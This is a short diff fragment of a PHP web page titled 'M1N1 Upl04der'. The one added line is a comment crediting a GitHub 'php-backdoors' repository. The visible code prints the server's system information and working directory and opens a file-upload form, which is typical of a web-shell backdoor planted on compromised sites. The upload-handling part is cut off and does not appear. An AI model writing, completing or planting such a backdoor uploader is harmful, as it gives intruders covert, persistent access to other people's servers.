@@ -8,6 +8,7 @@
 <font color="red"><br><br>
 <h1><font face="courier" color="white" style="text-shadow: 0px 0px 30px white;"> M1N1 Upl04der </h1><br><center
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 echo '<font color=white size=4> System: <font color=red size=5>[ <font color=lime size=3>'.php_uname().'<font color=red size=5> ]</font><br>';
 echo '<font color=white size=4>Directory: <font color=red size=5>[ <font color=lime size=3>'.getcwd().'<font color=red size=5> ]</font><br><br>';
 echo "<form method='post' enctype='multipart/form-data'>
